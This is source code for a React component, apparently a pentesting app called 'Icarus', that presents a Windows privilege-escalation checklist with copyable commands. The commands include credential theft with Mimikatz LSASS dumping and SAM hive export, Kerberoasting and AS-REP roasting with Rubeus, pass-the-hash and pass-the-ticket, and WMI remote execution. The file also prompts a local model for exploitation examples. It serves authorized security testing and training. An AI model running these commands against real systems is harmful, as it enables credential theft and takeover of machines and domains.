import { useState, useEffect, useRef, useCallback, useMemo } from 'react'
import { 
  Shield, ChevronDown, ChevronRight, Copy, Check, Cpu, 
  RotateCcw, ExternalLink, Save, Download, Upload, 
  Trash2, History, Star, 
  FileText, BookOpen, Target, Sparkles, Search, 
  Play, 
  Zap,
  AlertCircle
} from 'lucide-react'
import { useActiveModel } from '../models/ModelManager'
import AIResponseText from '../shared/AIResponseText'   // ✅ added for markdown AI rendering

type CheckItem = {
  id: string;
  label: string;
  command: string;
  note: string;
  risk: 'critical' | 'high' | 'medium' | 'low';
  references?: string[];
  exampleOutput?: string;
}

type Category = {
  id: string;
  title: string;
  icon: string;
  color: string;
  items: CheckItem[];
}

type SavedChecklist = {
  id: string;
  timestamp: number;
  checked: Record<string, boolean>;
  notes?: string;
  favorite?: boolean;
  tags?: string[];
}

const OLLAMA_HOST = 'http://127.0.0.1:11434'

const CATEGORIES: Category[] = [
  {
    id: 'sysinfo', title: 'System Information', icon: '💻', color: 'text-cyan-400',
    items: [
      { id: 'si1', label: 'Get system info', command: 'systeminfo', note: 'Look for OS version, hotfixes, and architecture', risk: 'medium', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo'] },
      { id: 'si2', label: 'Check OS version', command: 'ver && wmic os get Caption,Version,BuildNumber', note: 'Search for unpatched exploits on this version', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem'] },
      { id: 'si3', label: 'List installed hotfixes', command: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', note: 'Missing patches = kernel exploits', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering'] },
      { id: 'si4', label: 'Check architecture', command: 'wmic os get osarchitecture', note: 'Important for choosing correct exploit binary', risk: 'low', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem'] },
    ]
  },
  {
    id: 'services', title: 'Vulnerable Services', icon: '⚙️', color: 'text-amber-400',
    items: [
      { id: 'sv1', label: 'List all running services', command: 'sc query state= all', note: 'Look for non-standard or custom services', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query'] },
      { id: 'sv2', label: 'Check service permissions', command: 'accesschk.exe -uwcqv * /accepteula', note: 'Writable service = replace binary for SYSTEM', risk: 'critical', references: ['https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk'] },
      { id: 'sv3', label: 'Find weak service permissions', command: 'Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select Name,PathName,StartName', note: 'Services running as SYSTEM with weak ACLs', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject'] },
      { id: 'sv4', label: 'Check service binary permissions', command: 'icacls "C:\\Program Files\\*" 2>nul | findstr /i "(F) (M) (W) Everyone BUILTIN\\Users"', note: 'Writable binary path = replace with payload', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls'] },
    ]
  },
  {
    id: 'registry', title: 'Registry Exploits', icon: '🗝️', color: 'text-emerald-400',
    items: [
      { id: 'rg1', label: 'Check AlwaysInstallElevated', command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', note: 'Both = 1 means install MSI as SYSTEM', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated'] },
      { id: 'rg2', label: 'Search registry for passwords', command: 'reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s', note: 'Plaintext passwords stored in registry', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query'] },
      { id: 'rg3', label: 'Check AutoLogon credentials', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', note: 'May contain DefaultPassword in plaintext', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon'] },
      { id: 'rg4', label: 'Check PuTTY stored sessions', command: 'reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s', note: 'May contain proxy/SSH credentials', risk: 'high', references: ['https://www.chiark.greenend.org.uk/~sgtatham/putty/'] },
    ]
  },
  {
    id: 'tasks', title: 'Scheduled Tasks', icon: '⏰', color: 'text-yellow-400',
    items: [
      { id: 'st1', label: 'List all scheduled tasks', command: 'schtasks /query /fo LIST /v', note: 'Look for tasks running as SYSTEM with writable scripts', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks'] },
      { id: 'st2', label: 'Check task binary permissions', command: 'schtasks /query /fo CSV /nh | ForEach-Object { ($_ -split ",")[8] } | Sort-Object -Unique', note: 'If you can write the binary = SYSTEM execution', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/foreach-object'] },
      { id: 'st3', label: 'PowerShell scheduled tasks', command: 'Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"} | Select TaskName,TaskPath', note: 'Highest privilege tasks are prime targets', risk: 'high', references: ['https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask'] },
    ]
  },
  {
    id: 'tokens', title: 'Token Privileges', icon: '🎫', color: 'text-purple-400',
    items: [
      { id: 'tk1', label: 'Check current privileges', command: 'whoami /priv', note: 'SeImpersonate/SeAssignPrimaryToken = Potato attacks', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami'] },
      { id: 'tk2', label: 'Check current groups', command: 'whoami /groups', note: 'Look for BUILTIN\\Administrators or high-priv groups', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami'] },
      { id: 'tk3', label: 'Check SeImpersonate (Potato)', command: 'whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"', note: 'Present = use JuicyPotato, PrintSpoofer, or RoguePotato', risk: 'critical', references: ['https://github.com/ohpe/juicy-potato'] },
      { id: 'tk4', label: 'Check SeBackup/SeRestore', command: 'whoami /priv | findstr /i "SeBackupPrivilege SeRestorePrivilege"', note: 'Can read/write any file including SAM database', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants'] },
      { id: 'tk5', label: 'Check SeDebug privilege', command: 'whoami /priv | findstr /i "SeDebugPrivilege"', note: 'Can inject into SYSTEM processes', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights'] },
    ]
  },
  {
    id: 'unquoted', title: 'Unquoted Service Paths', icon: '📂', color: 'text-emerald-400',
    items: [
      { id: 'uq1', label: 'Find unquoted service paths', command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"', note: 'Place malicious binary at path interception point', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/services/service-properties'] },
      { id: 'uq2', label: 'PowerShell unquoted paths', command: 'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch \'"\' -and $_.PathName -match \' \'} | Select Name,PathName,StartName', note: 'Spaces in path without quotes = hijack opportunity', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject'] },
    ]
  },
  {
    id: 'adcs', title: 'ADCS / Certificate Abuse', icon: '📜', color: 'text-yellow-400',
    items: [
      { id: 'ad1', label: 'Check for ADCS (Certify)', command: 'Certify.exe find /vulnerable', note: 'ESC1-ESC8 misconfigurations allow domain privesc', risk: 'critical', references: ['https://github.com/GhostPack/Certify'] },
      { id: 'ad2', label: 'Enumerate certificate templates', command: 'certutil -TCAInfo && certutil -Template', note: 'Look for templates with enrollment rights for low-priv users', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil'] },
      { id: 'ad3', label: 'Check web enrollment', command: 'curl -k https://<CA>/certsrv/', note: 'NTLM relay to ADCS web enrollment = ESC8', risk: 'critical', references: ['https://posts.specterops.io/certified-pre-owned-d95910965cd2'] },
    ]
  },
  {
    id: 'kerberoast', title: 'Kerberoasting / AS-REP', icon: '🎭', color: 'text-red-400',
    items: [
      { id: 'kb1', label: 'Kerberoast (PowerView)', command: 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv -NoTypeInformation', note: 'Request TGS for SPNs, crack offline', risk: 'critical', references: ['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon'] },
      { id: 'kb2', label: 'Kerberoast (Rubeus)', command: 'Rubeus.exe kerberoast /outfile:hashes.txt', note: 'Dump all kerberoastable hashes', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus'] },
      { id: 'kb3', label: 'AS-REP Roasting', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt', note: 'Accounts with no pre-auth = AS-REP roast', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus#asreproast'] },
      { id: 'kb4', label: 'Find AS-REP vulnerable users', command: 'Get-DomainUser -PreauthNotRequired | Select SamAccountName', note: 'No pre-auth required = AS-REP roastable', risk: 'high', references: ['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon'] },
    ]
  },
  {
    id: 'creds', title: 'Credential Storage', icon: '🔐', color: 'text-red-400',
    items: [
      { id: 'cr1', label: 'Dump SAM with reg save', command: 'reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak', note: 'Requires admin — extract NTLM hashes with secretsdump', risk: 'critical', references: ['https://en.wikipedia.org/wiki/Security_Account_Manager'] },
      { id: 'cr2', label: 'Check credential manager', command: 'cmdkey /list', note: 'Stored credentials — use runas /savecred to exploit', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey'] },
      { id: 'cr3', label: 'Search for passwords in files', command: 'findstr /si password *.txt *.xml *.ini *.config 2>nul', note: 'Config files often have plaintext credentials', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr'] },
      { id: 'cr4', label: 'Check unattend.xml files', command: 'dir /s /b *unattend.xml *sysprep.xml *autounattend.xml 2>nul', note: 'Windows install files often contain base64 passwords', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/'] },
      { id: 'cr5', label: 'Mimikatz — dump LSASS', command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', note: 'Dump cleartext passwords from LSASS memory', risk: 'critical', references: ['https://github.com/gentilkiwi/mimikatz'] },
      { id: 'cr6', label: 'Check PowerShell history', command: 'type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt', note: 'Commands with passwords typed in PS session', risk: 'high', references: ['https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline'] },
    ]
  },
  {
    id: 'lateral', title: 'Lateral Movement', icon: '🔀', color: 'text-cyan-400',
    items: [
      { id: 'lt1', label: 'Pass the Hash (CrackMapExec)', command: 'crackmapexec smb <target> -u <user> -H <NTLM_hash>', note: 'Use captured NTLM hash to auth without password', risk: 'critical', references: ['https://github.com/byt3bl33d3r/CrackMapExec'] },
      { id: 'lt2', label: 'Pass the Ticket (Rubeus)', command: 'Rubeus.exe ptt /ticket:<base64_ticket>', note: 'Inject Kerberos ticket for impersonation', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus#ptt'] },
      { id: 'lt3', label: 'WMI lateral movement', command: 'wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c whoami > C:\\out.txt"', note: 'Remote code execution via WMI', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic'] },
      { id: 'lt4', label: 'Check SMB shares', command: 'net view \\\\<target> /all', note: 'Look for accessible shares on other hosts', risk: 'medium', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-view'] },
    ]
  },
]

const RISK_COLOR: Record<string, string> = {
  critical: 'text-red-400 border-red-400/40',
  high:     'text-amber-400 border-amber-400/40',
  medium:   'text-cyan-400 border-cyan-400/40',
  low:      'text-white/40 border-white/20',
}

const RISK_BG: Record<string, string> = {
  critical: 'bg-red-500/10',
  high:     'bg-amber-500/10',
  medium:   'bg-cyan-500/10',
  low:      'bg-white/5',
}

const RISK_PRIORITY: Record<string, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3
}

// Hoisted constants
const TOTAL_ITEMS = CATEGORIES.flatMap(c => c.items).length

const RISK_DIST = (() => {
  const dist: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0 }
  for (const cat of CATEGORIES) {
    for (const item of cat.items) {
      dist[item.risk] = (dist[item.risk] || 0) + 1
    }
  }
  return dist
})()

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      onClick={async () => {
        const show = () => {
          setCopied(true)
          setTimeout(() => setCopied(false), 2000)
        }
        if (navigator.clipboard?.writeText) {
          try {
            await navigator.clipboard.writeText(text)
            show()
            return
          } catch { /* fall through */ }
        }
        try {
          const el = document.createElement('textarea')
          el.value = text
          el.style.position = 'fixed'
          el.style.opacity = '0'
          el.style.left = '-9999px'
          document.body.appendChild(el)
          el.select()
          document.execCommand('copy')
          document.body.removeChild(el)
          show()
        } catch (err) {
          console.error('Copy fallback failed:', err)
        }
      }}
      aria-label="Copy to clipboard"
      className="flex items-center gap-1 text-xs text-white/40 hover:text-cyan-400 transition-colors flex-shrink-0"
    >
      {copied ? <><Check size={11} className="text-emerald-400" />copied</> : <><Copy size={11} />copy</>}
    </button>
  )
}

export default function WindowsPrivesc() {
  const activeModel = useActiveModel()
  const [ollamaAvailable, setOllamaAvailable] = useState<boolean | null>(null)
  const [ollamaError, setOllamaError] = useState<string | null>(null)
  
  const [checked, setChecked] = useState<Record<string, boolean>>({})
  const [expanded, setExpanded] = useState<Record<string, boolean>>({ sysinfo: true })
  const [aiHint, setAiHint] = useState<Record<string, string>>({})
  const [loadingHint, setLoadingHint] = useState<Record<string, boolean>>({})
  const [searchTerm, setSearchTerm] = useState('')
  const [activeTab, setActiveTab] = useState<'checklist' | 'history' | 'resources'>('checklist')
  const [showBeginnerTips, setShowBeginnerTips] = useState(true)
  const [savedChecklists, setSavedChecklists] = useState<SavedChecklist[]>(() => {
    try {
      const saved = localStorage.getItem('windows_privesc_checklists')
      return saved ? JSON.parse(saved) : []
    } catch { return [] }
  })
  const [notes, setNotes] = useState('')
  const [editingNote, setEditingNote] = useState(false)
  const [filterRisk, setFilterRisk] = useState('All')
  const [highlightedItems, setHighlightedItems] = useState<Set<string>>(new Set())

  const fileInputRef = useRef<HTMLInputElement>(null)
  const hintRequestIdRef = useRef(0)

  // ─── Check Ollama Availability ────────────────────────────────────────────
  useEffect(() => {
    async function checkOllama() {
      try {
        const response = await fetch(`${OLLAMA_HOST}/api/version`)
        setOllamaAvailable(response.ok)
        if (!response.ok) setOllamaError(`HTTP ${response.status}`)
      } catch {
        setOllamaAvailable(false)
        setOllamaError('Connection refused')
      }
    }
    checkOllama()
  }, [])

  // ─── Persistence ──────────────────────────────────────────────────────────
  useEffect(() => {
    try {
      localStorage.setItem('windows_privesc_checklists', JSON.stringify(savedChecklists))
    } catch (err) {
      if (err instanceof DOMException && err.name === 'QuotaExceededError') {
        console.error('windows_privesc_checklists: localStorage quota exceeded')
      } else {
        console.error('windows_privesc_checklists: save failed', err)
      }
    }
  }, [savedChecklists])

  // Auto-clear highlighted items after 1s
  useEffect(() => {
    if (highlightedItems.size === 0) return
    const t = setTimeout(() => setHighlightedItems(new Set()), 1000)
    return () => clearTimeout(t)
  }, [highlightedItems])

  const total = TOTAL_ITEMS
  const done = Object.values(checked).filter(Boolean).length
  const pct = total > 0 ? Math.round((done / total) * 100) : 0

  const toggle = (id: string) => {
    setChecked(p => ({ ...p, [id]: !p[id] }))
    setHighlightedItems(prev => {
      const next = new Set(prev)
      next.add(id)
      return next
    })
  }
  
  const toggleCat = (id: string) => setExpanded(p => ({ ...p, [id]: !p[id] }))
  
  const reset = () => { 
    setChecked({}); 
    setAiHint({});
    setNotes('');
  }

  const saveChecklist = useCallback(() => {
    const newChecklist: SavedChecklist = {
      id: crypto.randomUUID(),
      timestamp: Date.now(),
      checked: checked,
      notes: notes || undefined,
      favorite: false
    }
    setSavedChecklists(prev => [newChecklist, ...prev])
    setEditingNote(false)
  }, [checked, notes])

  const loadChecklist = useCallback((checklist: SavedChecklist) => {
    setChecked(checklist.checked)
    setNotes(checklist.notes || '')
    setActiveTab('checklist')
    setAiHint({}) // Clear stale hints
    
    // Auto-expand categories with checked items
    const expandedCats: Record<string, boolean> = {}
    CATEGORIES.forEach(cat => {
      const hasChecked = cat.items.some(item => checklist.checked[item.id])
      expandedCats[cat.id] = hasChecked
    })
    setExpanded(expandedCats)
  }, [])

  const deleteChecklist = (id: string) => {
    setSavedChecklists(prev => prev.filter(c => c.id !== id))
  }

  const toggleFavorite = (id: string) => {
    setSavedChecklists(prev => prev.map(c => 
      c.id === id ? { ...c, favorite: !c.favorite } : c
    ))
  }

  const exportChecklists = () => {
    const data = JSON.stringify(savedChecklists)
    const blob = new Blob([data], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `windows_privesc_${new Date().toISOString().slice(0,10)}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  const importChecklists = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = (e) => {
      try {
        const data = JSON.parse(e.target?.result as string)
        
        if (!Array.isArray(data)) {
          alert('Invalid file format: expected JSON array')
          return
        }

        const validData = data.filter((c): c is SavedChecklist =>
          typeof c === 'object' &&
          c !== null &&
          typeof c.id === 'string' &&
          typeof c.checked === 'object' &&
          typeof c.timestamp === 'number'
        )

        if (validData.length === 0) {
          alert('No valid checklists found in file')
          return
        }

        if (validData.length !== data.length) {
          console.warn(`Skipped ${data.length - validData.length} invalid entries`)
        }

        setSavedChecklists(prev => {
          const incomingIds = new Set(validData.map(c => c.id))
          const filtered = prev.filter(c => !incomingIds.has(c.id))
          return [...validData, ...filtered]
        })
      } catch (error) {
        console.error('Import error:', error)
        alert('Invalid file format. Please check the file.')
      }
    }
    reader.readAsText(file)
    if (fileInputRef.current) fileInputRef.current.value = ''
  }

  const clearAllChecklists = () => {
    if (!confirm(`Delete all ${savedChecklists.length} saved checklists? This cannot be undone.`)) return
    setSavedChecklists([])
  }

  const stats = useMemo(() => {
    const total = savedChecklists.length
    const favorited = savedChecklists.filter(c => c.favorite).length
    const totalItems = savedChecklists.reduce((sum, c) => 
      sum + Object.values(c.checked).filter(Boolean).length, 0
    )
    return { total, favorited, totalItems }
  }, [savedChecklists])

  // ─── AI Hint with Ollama availability check ─────────────────────────────
  const getHint = useCallback(async (item: CheckItem) => {
    if (!ollamaAvailable) {
      setAiHint(p => ({ 
        ...p, 
        [item.id]: `⚠️ Ollama is not running (${ollamaError || 'connection failed'}). Please start Ollama and try again.` 
      }))
      return
    }

    if (aiHint[item.id]) { 
      setAiHint(p => ({ ...p, [item.id]: '' }))
      return 
    }
    
    const myRequestId = ++hintRequestIdRef.current
    setLoadingHint(p => ({ ...p, [item.id]: true }))
    
    try {
      const { status, data } = await window.obscurum?.ollamaRequest?.('/api/chat', 'POST', {
        model: activeModel,
        stream: false,
        messages: [
          { role: 'system', content: 'You are a Windows privilege escalation expert. Give a concise 2-3 sentence explanation and a specific exploitation example. Be technical and direct. Plain text only, no markdown.' },
          { role: 'user', content: `Explain this Windows privesc check: "${item.label}". Command: ${item.command}` }
        ]
      }) ?? { status: 200, data: null }
      
      if (myRequestId !== hintRequestIdRef.current) return
      
      if (status >= 400) throw new Error(`Ollama returned HTTP ${status}`)
      const payload = data as { message?: { content?: string } } | null
      
      if (myRequestId !== hintRequestIdRef.current) return
      setAiHint(p => ({ ...p, [item.id]: payload?.message?.content || 'No response.' }))
    } catch (err: any) {
      if (myRequestId !== hintRequestIdRef.current) return
      setAiHint(p => ({ ...p, [item.id]: `Error: ${err.message || 'Failed to connect to Ollama'}` }))
    } finally {
      if (myRequestId === hintRequestIdRef.current) {
        setLoadingHint(p => ({ ...p, [item.id]: false }))
      }
    }
  }, [aiHint, activeModel, ollamaAvailable, ollamaError])

  // Filter items by search and risk
  const getFilteredItems = useCallback((items: CheckItem[]) => {
    return items.filter(item => {
      if (filterRisk !== 'All' && item.risk !== filterRisk) return false
      if (searchTerm) {
        const search = searchTerm.toLowerCase()
        return item.label.toLowerCase().includes(search) || 
               item.command.toLowerCase().includes(search) ||
               item.note.toLowerCase().includes(search)
      }
      return true
    })
  }, [filterRisk, searchTerm])

  // Filter categories
  const filteredCategories = useMemo(() => {
    if (!searchTerm && filterRisk === 'All') return CATEGORIES
    return CATEGORIES
      .map(cat => ({ ...cat, items: getFilteredItems(cat.items) }))
      .filter(cat => cat.items.length > 0)
  }, [searchTerm, filterRisk, getFilteredItems])

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
      
      {/* ── Header ── */}
      <div className="flex items-center justify-between px-8 py-4 border-b border-white/5 flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center border border-cyan-500/20" style={{ background: 'radial-gradient(circle, rgba(34,211,238,0.18), rgba(34,211,238,0.04))' }}>
            <Shield size={16} className="text-cyan-400" />
          </div>
          <div>
            <span className="text-white font-bold text-base">Icarus</span>
            <div className="text-white/40 text-xs">Windows Privilege Escalation · {CATEGORIES.length} categories</div>
          </div>
        </div>
        <div className="flex gap-2">
          <button 
            onClick={() => setShowBeginnerTips(!showBeginnerTips)}
            className="flex items-center gap-1.5 text-xs text-white/50 hover:text-white/80 transition-colors px-3 py-1.5 rounded-full border border-white/10 hover:border-white/20"
          >
            <BookOpen size={12} />
            {showBeginnerTips ? 'Hide Tips' : 'Show Tips'}
          </button>
          <button 
            onClick={() => setActiveTab('history')}
            className={`flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-full border transition-colors ${
              activeTab === 'history' 
                ? 'border-cyan-500/30 text-cyan-400 bg-cyan-500/10' 
                : 'border-white/10 text-white/50 hover:text-white/80 hover:border-white/20'
            }`}
          >
            <History size={12} />
            Saved {savedChecklists.length > 0 && `(${savedChecklists.length})`}
          </button>
          <button
            onClick={() => setActiveTab('resources')}
            className={`flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-full border transition-colors ${
              activeTab === 'resources' 
                ? 'border-amber-500/30 text-amber-400 bg-amber-500/10' 
                : 'border-white/10 text-white/50 hover:text-white/80 hover:border-white/20'
            }`}
          >
            <BookOpen size={12} />
            Resources
          </button>
          <div className={`flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-full border ${
            ollamaAvailable === true ? 'border-emerald-500/30 text-emerald-400/70' : 'border-red-500/30 text-red-400/70'
          }`}>
            <span className={`w-1.5 h-1.5 rounded-full ${ollamaAvailable === true ? 'bg-emerald-400 animate-pulse' : 'bg-red-400'}`} />
            {ollamaAvailable === true ? 'Online' : 'Offline'}
          </div>
        </div>
      </div>

      {/* ── Main Content ── */}
      <div className="px-8 py-6 max-w-6xl mx-auto">

        {/* Ollama Offline Warning */}
        {ollamaAvailable === false && (
          <div className="mb-6 p-3 rounded-xl border border-red-500/20 bg-red-500/5 flex items-center gap-2 text-xs text-red-400">
            <AlertCircle size={13} /> Ollama is not running at {OLLAMA_HOST}. AI explain functionality is disabled.
          </div>
        )}

        {/* Beginner Tips */}
        {showBeginnerTips && (
          <div className="mb-6 p-4 rounded-2xl border border-amber-500/10 bg-amber-500/5">
            <div className="flex items-center gap-2 mb-3">
              <BookOpen size={16} className="text-amber-400" />
              <span className="text-amber-400 text-xs font-semibold tracking-wider">Methodology Tips</span>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs text-white/60">
              {[
                'Start with systeminfo to identify missing patches',
                'Run whoami /priv to check for dangerous privileges',
                'Always check unquoted service paths first',
                'Use WinPEAS for automated comprehensive enumeration'
              ].map((tip, i) => (
                <div key={i} className="flex items-start gap-2">
                  <span className="text-amber-400 mt-0.5">•</span>
                  <span>{tip}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Stats Bar */}
        {savedChecklists.length > 0 && (
          <div className="mb-6 grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
            <div className="bg-white/5 border border-white/5 rounded-xl p-3 text-center">
              <div className="text-white/40">Total</div>
              <div className="text-white font-bold text-lg">{stats.total}</div>
            </div>
            <div className="bg-white/5 border border-yellow-400/20 rounded-xl p-3 text-center">
              <div className="text-yellow-400/60">Favorited</div>
              <div className="text-yellow-400 font-bold text-lg">{stats.favorited}</div>
            </div>
            <div className="bg-white/5 border border-emerald-400/20 rounded-xl p-3 text-center">
              <div className="text-emerald-400/60">Checked</div>
              <div className="text-emerald-400 font-bold text-lg">{stats.totalItems}</div>
            </div>
            <div className="bg-white/5 border border-cyan-400/20 rounded-xl p-3 text-center">
              <div className="text-cyan-400/60">Complete</div>
              <div className="text-cyan-400 font-bold text-lg">{total > 0 ? Math.round((done/total)*100) : 0}%</div>
            </div>
          </div>
        )}

        {/* ── Checklist Tab ── */}
        {activeTab === 'checklist' && (
          <>
            {/* Progress */}
            <div className="mb-6 bg-white/5 border border-white/5 rounded-2xl p-4">
              <div className="flex justify-between text-xs mb-2 flex-wrap gap-2">
                <span className="text-white/40">Progress</span>
                <span className="text-cyan-400 font-mono font-semibold">{done}/{total} checks — {pct}%</span>
              </div>
              <div className="h-1.5 bg-white/10 rounded-full overflow-hidden">
                <div
                  className="h-full rounded-full transition-all duration-500"
                  style={{ width: pct + '%', background: 'linear-gradient(90deg, #6366f1, #a855f7, #22d3ee)' }}
                />
              </div>
              <div className="flex gap-3 mt-3 flex-wrap">
                {(['critical','high','medium','low'] as const).map(r => (
                  <span key={r} className={"text-[10px] px-2 py-0.5 rounded-full border font-mono " + RISK_COLOR[r] + " " + RISK_BG[r]}>
                    ● {r} ({RISK_DIST[r] || 0})
                  </span>
                ))}
              </div>
            </div>

            {/* Search and Filter */}
            <div className="flex gap-2 mb-6 flex-wrap">
              <div className="flex-1 min-w-[150px] relative">
                <Search size={12} className="absolute left-3 top-1/2 -translate-y-1/2 text-white/20" />
                <input
                  value={searchTerm}
                  onChange={e => setSearchTerm(e.target.value)}
                  placeholder="Search checks..."
                  className="w-full bg-white/5 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs font-mono text-white/60 focus:outline-none focus:border-cyan-500/30 placeholder-white/20"
                />
              </div>
              <select
                value={filterRisk}
                onChange={e => setFilterRisk(e.target.value)}
                className="bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white/60 focus:outline-none focus:border-cyan-500/30"
              >
                <option value="All">All Risks</option>
                <option value="critical">Critical</option>
                <option value="high">High</option>
                <option value="medium">Medium</option>
                <option value="low">Low</option>
              </select>
              <button
                onClick={saveChecklist}
                disabled={done === 0}
                className="flex items-center gap-1.5 text-xs px-4 py-2 bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30 border border-emerald-500/30 rounded-xl transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
              >
                <Save size={12} /> Save
              </button>
              <button onClick={reset} className="flex items-center gap-1.5 text-xs text-white/40 hover:text-red-400 transition-colors px-3 py-2 border border-white/10 rounded-xl hover:border-red-500/30">
                <RotateCcw size={12} /> Reset
              </button>
            </div>

            {/* WinPEAS tip */}
            <div className="mb-6 p-4 rounded-2xl border border-cyan-500/10 bg-cyan-500/5">
              <div className="flex items-start gap-3">
                <span className="text-cyan-400 text-base flex-shrink-0">💡</span>
                <div className="flex-1 min-w-0">
                  <div className="text-cyan-400 text-xs font-semibold mb-1.5">Run WinPEAS first for automated enumeration</div>
                  <div className="flex items-center gap-2 bg-black/30 border border-white/5 rounded-xl px-3 py-1.5">
                    <code className="text-emerald-400 text-xs font-mono flex-1">winpeas.exe &gt; winpeas_output.txt</code>
                    <CopyBtn text="winpeas.exe > winpeas_output.txt" />
                  </div>
                </div>
              </div>
            </div>

            {/* Categories */}
            <div className="space-y-3">
              {filteredCategories.map(cat => {
                const catDone = cat.items.filter(i => checked[i.id]).length
                const isOpen = expanded[cat.id]
                const sortedItems = [...cat.items].sort((a, b) => RISK_PRIORITY[a.risk] - RISK_PRIORITY[b.risk])

                return (
                  <div key={cat.id} className="bg-white/5 border border-white/5 rounded-2xl overflow-hidden transition-all hover:border-white/10">
                    <button
                      onClick={() => toggleCat(cat.id)}
                      className="w-full flex items-center gap-3 px-5 py-3.5 hover:bg-white/5 transition-colors"
                    >
                      <span className="text-lg flex-shrink-0">{cat.icon}</span>
                      <span className={"font-semibold text-sm flex-1 text-left " + cat.color}>{cat.title}</span>
                      <span className="text-xs text-white/30 font-mono">{catDone}/{cat.items.length}</span>
                      {isOpen ? <ChevronDown size={14} className="text-white/30" /> : <ChevronRight size={14} className="text-white/30" />}
                    </button>

                    {isOpen && (
                      <div className="border-t border-white/5 divide-y divide-white/5">
                        {sortedItems.map(item => {
                          const isHighlighted = highlightedItems.has(item.id)
                          return (
                            <div 
                              key={item.id} 
                              className={`transition-all ${checked[item.id] ? 'bg-emerald-500/5' : ''} ${isHighlighted ? 'bg-emerald-500/20' : ''}`}
                            >
                              <div className="flex items-start gap-3 px-5 py-3.5">

                                <div
                                  onClick={() => toggle(item.id)}
